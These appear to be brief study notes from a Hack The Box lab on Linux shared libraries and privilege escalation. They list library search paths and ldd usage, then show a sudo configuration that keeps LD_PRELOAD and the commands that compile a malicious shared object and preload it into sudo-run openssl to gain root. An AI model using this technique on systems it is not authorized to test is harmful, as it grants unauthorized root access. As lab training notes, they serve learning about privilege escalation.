- [ ] About Shared Libraries
- [ ] Sudo and LD_PRELOAD Exploitation

About Shared Libraries!!!
```sh
# When Compiling a a program, gcc options to set .so paths
-rpath or -rpath-link
# Env Variables
LD_RUN_PATH or LD_LIBRARY_PATH 
LD_PRELOAD
# Default .so folders
/lib or /usr/lib
cat /etc/ld.so.conf
# ldd to list a program .so dependancies
ldd /bin/ls
ldd /home/user/program
```
Sudo and LD_PRELOAD Exploitation!!!
```sh
sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl


gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl
```
![[Pasted image 20251020130106.png]]